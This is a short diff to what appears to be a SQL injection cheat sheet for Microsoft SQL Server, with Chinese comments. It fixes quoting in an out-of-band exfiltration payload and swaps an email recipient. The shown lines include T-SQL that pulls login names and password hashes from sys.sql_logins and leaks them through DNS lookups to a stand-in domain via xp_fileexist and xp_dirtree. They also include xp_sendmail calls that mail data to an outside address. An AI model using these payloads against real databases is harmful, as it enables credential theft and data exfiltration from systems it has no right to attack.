@@ -439,7 +439,7 @@ SELECT column1 FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 12.0;Database=
 ```sql
 DECLARE @host varchar(800);
 select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.domain.com' from sys.sql_logins;
-exec('xp_fileexist "\' + @host + 'c$boot.ini"');
+exec('xp_fileexist "\' + @host + \'c$boot.ini"');
 //DNS查询
 
 xp_dirtree '\\data.domain.com\file'
@@ -451,7 +451,7 @@ sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail 
 EXEC master..xp_sendmail 'snowwolf@email.com', 'test.'
 //xp_sendmail查询
 
-EXEC xp_sendmail @recipients='harold@netspi.com',
+EXEC xp_sendmail @recipients='snowwolf@email.com',
 @message='test.',
 @copy_recipients='snowwolf@email.com',
 @subject='TEST'
